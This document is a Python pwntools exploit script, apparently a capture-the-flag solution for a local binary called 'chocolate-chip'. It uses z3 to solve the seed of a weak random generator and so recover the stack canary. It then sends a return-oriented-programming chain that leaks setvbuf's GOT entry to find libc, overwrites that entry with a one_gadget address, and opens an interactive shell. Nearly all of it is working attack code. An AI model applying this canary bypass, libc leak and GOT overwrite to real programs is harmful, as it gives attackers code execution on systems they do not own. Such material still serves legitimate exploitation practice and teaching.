from pwn import * 
import z3


p = process("./chocolate-chip")

recv_str = []
res_str = []

setvbuf_got = 0x601048
setvbuf_offset = 0x812f0
printf_plt = 0x400680
read_plt = 0x400690
popr = 0x400ab3 # pop rdi ; ret
ppr = 0x400ab1 # pop rsi ; pop r15 ; ret
pdr = 0x4007cb # pop rdx ; ret
ret = 0x40063e # ret
 
main = 0x400822 #main - for call setvbuf

one_gadget = [0x4f2c5,0x4f322,0x10a38c]


p.recvuntil("sssh")
for i in range(0,10) : 
    recv_str.append(p.recvline()[:-1])

for i in range(0,10) : 
    if i%2 == 0 : 
        res_str.append(int(recv_str[i//2]))
        #print(i//2)
    else : 
        res_str.append(int(recv_str[i//2+5]))
        #print(i//2+4)
        
for i in range(0,10):
    log.info(str(i)+" : "+hex(res_str[i]))

s = z3.Solver()
seed = z3.BitVec('seed',64)
equ = seed ^ 0x5Deece66d
for i in range(0,10) : 
    equ = equ * 0x5Deece66d + 11 
    s.add( ( equ >> 16) & 0xffffffff == res_str[i] ) #filtering last 8 bytes
    
log.info(s.check())    #check find soulution
canary = s.model()[seed].as_long() 
log.info(canary)

# sleep(0.2)

pause()

payload = "a"*0x14
payload += p64(canary)
payload += "b"*0x24 + "c"*0x8 

payload += p64(ret) #when printf error while rtl, add one ret for set stack.

payload += p64(popr)
payload += p64(setvbuf_got)
payload += p64(printf_plt) #printf(write_got)

payload += p64(popr)
payload += p64(0)
payload += p64(ppr)
payload += p64(setvbuf_got)
payload += "a"*8
payload += p64(pdr)
payload += p64(8)
payload += p64(read_plt) #read(0,setvbuf_got,8) - got overwrite 

payload += p64(main)

p.sendlineafter("hello",payload)

p.recvline()

leak = u64(p.recv(6)+"\x00"*2)
libc = leak - setvbuf_offset 
one = libc+one_gadget[0]

log.info(hex(libc))

p.sendline(p64(one)) #setvbuf's got overwrited to oneshot gadget

p.interactive()